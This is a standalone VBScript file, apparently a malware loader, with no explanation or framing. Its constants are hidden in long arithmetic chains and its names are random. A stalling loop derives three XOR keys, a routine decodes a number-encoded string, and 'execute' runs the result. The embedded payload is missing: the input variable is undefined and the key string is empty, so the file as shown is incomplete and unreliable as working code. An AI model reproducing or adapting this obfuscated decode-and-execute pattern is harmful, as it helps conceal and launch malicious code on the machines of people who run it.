function lCrWPm(WHNFcjI, BDaax)
On Error Resume Next
QaEEZzc = WHNFcjI
HxIlguY = ""
PDAgcj = ""
zALzw = 317 + 132 + 406 + 11 + 14 - 11 + 380 - 467 - 781
for vcbcEU=414 - 359 + 21 - 444 + 10 - 20 - 125 + 288 + 216 to len(QaEEZzc)
jkewoifjeikfiejf = mid(QaEEZzc, vcbcEU, 206 + 5 - 321 + 416 + 311 + 446 - 14 - 16 - 1032)  
if ( asc(jkewoifjeikfiejf) > 265 + 193 + 218 + 484 + 176 - 11 + 247 - 190 - 1335 and asc(mid(QaEEZzc, vcbcEU, 332 + 454 + 382 + 409 - 282 - 135 - 12 - 23 - 1124)) < 391 + 131 + 200 + 433 + 2 - 172 + 408 - 259 - 1076 ) then
HxIlguY = HxIlguY + mid(QaEEZzc, vcbcEU, 245 - 498 + 274 - 280 + 18 + 17 - 2 + 23 + 204)
zALzw = 219 + 3 + 18 - 17 + 203 - 292 + 25 - 446 + 288
else
if zALzw = 451 + 209 + 230 + 8 - 17 + 25 + 248 + 463 - 1616 then
gUKYKa = CInt(HxIlguY)
VOczOq = DBZtCN(gUKYKa, BDaax)
PDAgcj = PDAgcj + Chr(VOczOq)
end if
HxIlguY = ""
zALzw = 461 + 8 - 22 + 418 - 160 + 12 + 25 + 392 - 1134
end if
next
lCrWPm = PDAgcj
end function
function DBZtCN(kThqZn, euDGeq)
On Error Resume Next
YjGtd = kThqZn xor euDGeq
DBZtCN = YjGtd
end function

function NbfAbM(LqNFGu)
On Error Resume Next
NbfAbM = CStr(LqNFGu)
end function
csRKTj = Chr(440 + 194 + 396 - 18 + 6 + 18 - 23 + 4 - 1008)
oRwIeGs = Chr(230 - 5 + 121 - 338 - 484 + 4 + 21 - 2 + 462)
RBRwO = replace("gkiCvi ", "gkiCvi", "")
ZSZwVR = replace("XOdRd", "XOdRd", "")
clMgof = replace(clMgof, csRKTj, ZSZwVR)
nkDuMe = replace(nkDuMe, oRwIeGs, ZSZwVR)
clMgof = replace(clMgof, RBRwO, ZSZwVR)
eqHWuM = 116 - 400 + 23 + 22 - 3 + 7 - 342 - 25 + 30602
nkDuMe = replace(nkDuMe, RBRwO, ZSZwVR)
fQySCa = ""
nbvgl = 467 + 202 - 127 - 11 + 383 + 478 - 368 - 16 - 1003 + 147 + 2 - 367 - 16 + 23 + 475 - 16 + 199 - 439
vpDnBa = 461 - 281 + 230 - 406 + 10 + 403 - 14 + 19 - 422 + 368 - 197 + 6 + 10 - 14 + 24 - 225 + 14 + 20
For vZNoVU = 171 - 471 + 300 + 2 - 410 + 468 - 497 - 20 + 457 To 456 + 11 - 212 + 418 - 21 - 138 - 11 + 190 + 2386712 Step 273 - 3 + 359 - 12 + 324 - 405 + 15 + 211 - 761
NjfUao = NjfUao + nbvgl - vpDnBa
Next
jnGPT = 389 + 129 - 11 - 178 + 227 + 463 + 424 - 6 + 998562
NjfUao = NjfUao * jnGPT
WqxDqH = NbfAbM(NjfUao)
JUMBFKd = Mid(WqxDqH, 410 - 11 - 11 + 12 + 261 + 11 + 170 + 19 - 856, 238 - 376 + 462 - 437 + 163 + 100 + 459 - 443 - 164)
PboUoc = CInt(JUMBFKd)
XJtCHu = Asc(Mid(fQySCa, PboUoc, 122 + 3 - 12 + 306 + 13 - 11 + 2 - 419 - 3))
JUMBFKd = Mid(WqxDqH, 329 + 201 + 334 - 167 - 486 + 291 - 9 + 213 - 700, 130 - 453 + 20 + 15 - 5 + 473 - 10 + 448 - 616)
PboUoc = CInt(JUMBFKd)
zRhEdS = Asc(Mid(fQySCa, PboUoc, 311 + 272 + 148 - 19 + 351 - 21 + 266 - 186 - 1121))
JUMBFKd = Mid(WqxDqH, 374 - 12 + 474 + 24 - 4 + 392 - 112 - 282 - 847, 356 - 378 + 126 - 11 - 12 + 290 - 2 - 220 - 147)
PboUoc = CInt(JUMBFKd)
NlkWRv = Asc(Mid(fQySCa, PboUoc, 137 + 217 - 9 + 19 - 19 + 24 - 477 + 9 + 100))
FtOpFb = lCrWPm(Xjaxw, NlkWRv)
FtOpFb = lCrWPm(FtOpFb, zRhEdS)

FtOpFb = lCrWPm(FtOpFb, XJtCHu)
execute"          "&FtOpFb
